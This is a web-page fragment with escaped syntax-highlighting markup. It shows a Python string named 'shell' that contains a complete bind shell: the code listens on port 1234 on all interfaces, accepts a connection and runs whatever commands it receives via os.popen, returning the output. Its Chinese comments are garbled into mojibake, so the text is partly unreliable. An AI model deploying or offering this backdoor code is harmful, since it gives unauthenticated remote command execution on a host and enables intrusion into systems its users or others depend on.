    shell &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
    #ÊúçÂä°Âô®Á´Ø
    import socket
    import os
    s=socket.socket()   #ÂàõÂª∫Â•óÊé•Â≠ó #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    s.bind((&#39;0.0.0.0&#39;,1234))    #ÁªëÂÆöÂú∞ÂùÄÂíåÁ´ØÂè£#0.0.0.0Êé•Êî∂‰ªªÊÑèÂÆ¢Êà∑Á´ØipËøûÊé•
    s.listen(5)                 #Ë∞ÉÁî®listenÊñπÊ≥ïÂºÄÂßãÁõëÂê¨Á´ØÂè£Ôºå‰º†ÂÖ•ÁöÑÂèÇÊï∞‰∏∫Á≠âÂæÖËøûÊé•ÁöÑÊúÄÂ§ßÊï∞Èáè
    con,addr=s.accept()     #Êé•Âèó‰∏Ä‰∏™ÂÆ¢Êà∑Á´ØÁöÑËøûÊé•
    #print(con,addr)

    for i in range(10):
        cmd=con.recv(1024)
        print(cmd)
        command=cmd.decode()
        if command.startswith(&#39;cd&#39;):
            os.chdir(command[2:].strip())   #ÂàáÊç¢Ë∑ØÂæÑ
            result=os.getcwd()      #ÊòæÁ§∫Ë∑ØÂæÑ
        else:
            result=os.popen(command).read()
        if result:
            con.send(result.encode())
        else:
            con.send(b&#39;OK!&#39;)
